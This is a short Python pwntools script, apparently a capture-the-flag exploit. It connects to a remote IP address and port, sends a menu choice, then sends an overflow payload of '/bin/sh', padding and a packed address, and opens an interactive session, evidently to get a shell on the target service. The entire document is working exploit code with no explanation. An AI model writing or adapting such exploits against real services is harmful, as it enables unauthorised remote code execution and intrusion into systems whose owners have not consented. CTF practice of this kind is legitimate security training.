from pwn import *

proc = remote("109.233.56.90", 11670)
proc.sendline("1")
proc.send(b"/bin/sh\x00"+b"A"*(0x20) + p64(0x00401040))
proc.interactive()

